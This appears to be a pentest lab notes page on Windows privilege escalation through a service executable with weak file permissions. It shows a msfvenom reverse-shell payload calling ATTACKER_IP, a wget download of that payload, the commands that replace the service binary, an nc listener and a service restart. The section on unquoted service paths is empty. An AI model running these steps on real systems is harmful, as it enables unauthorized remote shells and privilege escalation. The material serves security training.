# Abusing Windows Service Misconfig

## Enumeration Windows Services

Windows services are controlled by the **Service Control Manager** (SCM). The SCM manages the status of services, checks their current status, and configures them. Each service has an executable that the SCM runs when a service starts. These executables have special functions to communicate with the SCM, so not any executable can function as a service. Additionally, each service defines the user account it runs under.

View service details for a specific service:

```powershell
sc qc WindowsScheduler

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1

```

The **BINARY\_PATH\_NAME** shows the executable file, while the **SERVICE\_START\_NAME** indicates the account running the service.



## Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

### Check service executable file permissions

```powershell
icacls C:\PROGRA~2\SYSTEM~1\WService.exe

C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

In this scenario Everyone group has modify permissions (M) on the service's executable.

Now we can overwrite the file with a RevShell created with Msfvenom

<details>

<summary>Msfconsole RevShell Scenario</summary>

<pre class="language-bash"><code class="lang-bash">msfvenom -p<a data-footnote-ref href="#user-content-fn-1"> </a>windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

python3 -m http.server
</code></pre>

Get the payload in the target machine:

```bash
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

we proceed to replace the service executable with our payload.

```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

start a reverse listener on our attacker machine

```bash
nc -lvp 4445
```





</details>

Once we have replaced the payload, we can wait which the service will run, or if we have the privilege, restart the service to get the reverse shell connection:

```powershell
sc stop windowsscheduler
sc start windowsscheduler
```

{% hint style="info" %}
PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
{% endhint %}



## Unquoted Service Paths





[^1]: 
